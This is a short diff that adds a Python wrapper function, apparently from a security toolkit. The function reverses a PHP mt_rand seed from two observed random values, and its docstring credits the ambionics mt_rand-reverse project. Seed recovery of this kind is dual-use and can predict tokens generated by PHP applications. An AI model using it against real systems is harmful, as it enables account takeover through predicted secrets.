+def reverse_mt_rand(_R000: int, _R227: int, offset: int, flavour: int) -> int:
+    """reverse mt_rand seed without brute force
+
+    Origin:
+        https://github.com/ambionics/mt_rand-reverse
+
+    Args:
+        _R000 (int): first random value.
+        _R227 (int): 228th random value.
+        offset (int): number of mt_rand() calls in between the seeding and the first value.
+        flavour (int): 0 (PHP5) or 1 (PHP7+)
+
+    Returns:
+        int: the seed
+    """
+    return reverse_mt_rand_main(_R000, _R227, offset, flavour)
